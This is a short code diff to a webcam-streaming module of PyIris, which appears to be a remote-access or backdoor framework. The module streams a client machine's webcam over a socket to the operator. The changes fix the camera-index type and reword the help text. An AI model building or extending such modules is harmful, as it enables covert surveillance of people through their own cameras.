@@ -11,7 +11,7 @@ def main(option):
 def webcam_stream(sock, data):
     index_list = data.split(" ")
     if len(index_list) > 1:
-        camera = cv2.VideoCapture(index_list[1])
+        camera = cv2.VideoCapture(int(index_list[1]))
     else: 
         camera = cv2.VideoCapture(0)
     if not camera.isOpened():
@@ -34,10 +34,10 @@ def webcam_stream(sock, data):
         config.logics.append('''
             elif command == "webcam_stream":
                 webcam_stream(s, data)''')
-        config.help_menu['webcam_stream <camera index>'] = 'Stream clients webcam to PyIris. Webcam index is optional, by default it will be zero. In some instances it may need to be provided due to the 0 index being unavailable'
+        config.help_menu['webcam_stream <camera index>'] = 'Stream clients webcam to PyIris. Camera index is optional, by default it will be zero. In some instances it may need to be provided due to the 0 index being unavailable'
     elif option == 'info':
         print('\nName             : Webcam streaming component' \
               '\nOS               : Linux' \
               '\nRequired Modules : pickle, cv2' \
-              '\nCommands         : webcam_stream' \
+              '\nCommands         : webcam_stream <camera index>' \
               '\nDescription      : Stream clients webcam to PyIris\n')
